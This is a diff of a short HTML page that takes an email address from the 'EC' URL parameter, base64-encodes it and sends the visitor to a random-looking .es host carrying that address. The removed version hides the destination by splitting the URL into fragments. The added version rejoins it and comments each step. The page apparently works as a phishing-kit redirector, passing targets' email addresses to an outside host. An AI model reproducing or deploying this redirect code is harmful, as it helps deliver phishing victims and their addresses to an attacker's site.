@@ -3,30 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>..t</title>
+  <title>Email Redirect</title>
   <script>
     function encodeEmailAndRedirect() {
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('EC');
+      const email = urlParams.get('EC'); // Get the email from the query parameter 'EC'
 
       if (email) {
+        // Encode the email using Base64
         const encodedEmail = btoa(email);
-        const redirectUrlParts = [
-          "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?"
-        ];
 
-        const finalUrl = redirectUrlParts.join("") + encodedEmail;
+        // Define the base URL
+        const baseUrl = "https://ebuj6a.jxebpueehg.es/OlLfmM/?";
 
+        // Append the encoded email to the base URL
+        const finalUrl = baseUrl + encodedEmail;
+
+        // Redirect to the final URL
         window.location.href = finalUrl;
       } else {
-        alert("No access!");
+        alert("Email parameter 'EC' is missing!");
       }
     }
 
+    // Call the function to execute the script
     encodeEmailAndRedirect();
   </script>
 </head>
 <body>
-  <h1>...</h1>
+  <h1>Redirecting...</h1>
 </body>
 </html>
